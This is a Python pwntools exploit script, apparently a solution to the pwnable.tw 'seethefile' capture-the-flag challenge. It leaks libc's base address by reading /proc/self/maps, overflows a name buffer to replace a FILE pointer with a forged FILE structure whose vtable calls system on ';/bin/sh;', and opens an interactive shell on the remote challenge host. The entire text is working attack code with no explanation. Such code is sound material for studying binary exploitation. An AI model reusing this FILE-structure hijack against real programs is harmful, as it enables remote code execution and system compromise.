#!/usr/bin/env python3

from pwn import *
import regex

exe = ELF("seethefile_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.23.so")

#p = gdb.debug('./seethefile_patched', gdbscript='''
#	b main
#	b system 
#	b fclose
#	continue
#''')
#p = process('./seethefile_patched')
p = remote('chall.pwnable.tw', 10200)

system_offset = libc.symbols["system"]
print(f"[*] system offset: {hex(system_offset)}")

name_addr = 0x0804b260
fp_addr = 0x0804b280

def open_file(filename):
	p.sendlineafter(b'Your choice :', b'1')
	p.sendlineafter(b'What do you want to see :', filename)

def read_file():
	p.sendlineafter(b'Your choice :', b'2')

def write_file():
	p.sendlineafter(b'Your choice :', b'3')

def exit_(name):
	p.sendlineafter(b'Your choice :', b'5')
	p.sendlineafter(b'Leave your name :', name)


open_file(b'/proc/self/maps')
memory_map_leak = b''
for _ in range(3):
	read_file()
	write_file()
	memory_map_leak += p.recv(400)
memory_map_leak = b" ".join(memory_map_leak.split())
print(f'[*] MEMORY MAP LEAK:\n{memory_map_leak}')

#libc_pos = memory_map_leak.find(b"libc.so.6")             # Works for local
libc_pos = memory_map_leak.find(b"libc-2.23.so")          # Works for remote
libc_base = None
if libc_pos != -1:
  before_libc = memory_map_leak[:libc_pos]
  matches = re.findall(
    rb'f7[0-9a-f]{6}-f7[0-9a-f]{6}',
    before_libc
  )
  if matches:
    libc_range = matches[-1]
    print(f'\n[*] LIBC RANGE: {libc_range}')
    libc_base = int(libc_range[:8], 16)
    print(f'[*] LIBC BASE: {hex(libc_base)}')

system_addr = libc_base + system_offset
print(f"[*] SYSTEM ADDR: {hex(system_addr)}")

fake_file  = p32(0xFFFFDFFF)          # flags: clear _IO_IS_FILEBUF
fake_file += b";/bin/sh;"             # command string (shell ignores the garbage flags)
fake_file += b'A' * (72 - len(fake_file))   # pad to offset 72

fake_file += p32(exe.symbols['filename'] + 32)   # _lock (offset 72)
fake_file += p32(0x0804b2d4)                     # vtable (offset 76)
fake_file += b'B' * 4                            # __dummy
fake_file += b'C' * 4                            # __dummy2
fake_file += p32(system_addr)                    # __finish -> system

payload  = b'A' * 32                             # fill name[32]
payload += p32(0x0804b284)                       # overwrite fp -> fake FILE
payload += fake_file

exit_(payload)

p.interactive()

